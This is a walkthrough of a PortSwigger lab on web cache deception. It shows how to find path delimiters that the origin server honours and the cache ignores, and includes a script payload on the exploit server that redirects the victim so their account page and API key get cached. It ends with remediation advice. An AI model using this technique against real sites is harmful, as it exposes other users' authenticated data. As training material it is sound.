# Lab: Exploiting Path Delimiters for Web Cache Deception

**Category:** Web Cache Deception
**Difficulty:** Practitioner
**Lab link:** [Exploiting path delimiters for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters)

## Overview

The cache applies a static-extension caching rule — paths ending in `.js` (or similar) are stored. The origin server treats certain non-standard characters as path delimiters, truncating the path at that character and routing to the base resource. The cache does not recognise the same delimiter, so it sees the full path and applies its static rule.

**Result:** A path like `/my-account<delimiter>wcd.js` causes the origin to serve the authenticated account page, while the cache stores it as a static file.

## Goal

Steal the API key from the victim user (carlos) by deceiving the cache into storing their account page response.

## Key Concepts

- **Delimiter discrepancy:** The origin treats certain characters (`;`, `?`, `%23`, etc.) as path delimiters that the cache does not. The origin sees `/my-account` and returns the account page; the cache sees `/my-account<delimiter>wcd.js` and applies its static `.js` rule.
- **Static extension caching rule:** The cache stores responses for paths ending in `.js`, treating them as static assets.
- **Cache buster:** A unique query parameter (`?wcd`) ensures a fresh cache entry per victim delivery.

## Delimiter Discovery

Use Burp Intruder (Sniper) on:
```
GET /my-account§§.js
```

Payload: PortSwigger's delimiter list (`/web-security/web-cache-deception/wcd-lab-delimiter-list`)  
**Important:** Disable URL-encoding in Intruder payload options.

A 200 response containing account page content indicates the origin treated that character as a delimiter.

## Exploit Path

```
/my-account<delimiter>wcd.js?wcd
```

Where `<delimiter>` is the character discovered via Intruder (commonly `;`, `%3f`, `%23`, or similar).

- **Origin sees:** `/my-account` → returns authenticated account page with API key
- **Cache sees:** path ends in `.js` → matches static extension rule → caches it

## Solution

### Step 1 — Identify the delimiter

Send `GET /my-account§§.js` to Intruder. Run Sniper with the delimiter list (URL-encoding off). Filter results by status 200 — the matching characters are path delimiters the origin recognises.

### Step 2 — Confirm the cache applies a static extension rule

```
GET /resources/something.js  (twice)
```
`X-Cache: miss` → `hit` → confirms the cache stores `.js` paths.

### Step 3 — Build and test the exploit path

```
GET /my-account<delimiter>wcd.js
```
Logged in as wiener: origin returns account page, `X-Cache: hit` on second send.

### Step 4 — Deliver to victim

On the exploit server:
```html
<script>document.location="https://<lab>/my-account<delimiter>wcd.js?wcd"</script>
```
Deliver to victim → carlos visits, his account page is cached at that URL.

### Step 5 — Retrieve API key

Fetch `https://<lab>/my-account<delimiter>wcd.js?wcd` unauthenticated. The cache serves carlos's account page. Copy the API key and submit.

## Remediation

- Apply `Cache-Control: no-store` or `private` to all authenticated responses.
- Normalise delimiter characters at the cache layer before applying extension-based caching rules.
- Do not cache responses based on file extension alone — verify the content type of the actual response.

## Key Takeaways

- Delimiter discrepancies are the simplest form of WCD: no path traversal needed, just a character the origin strips but the cache keeps.
- The static extension rule (`.js`) is what makes the cache store the response.
- Discovery is systematic: Intruder with the delimiter list quickly identifies which characters work.
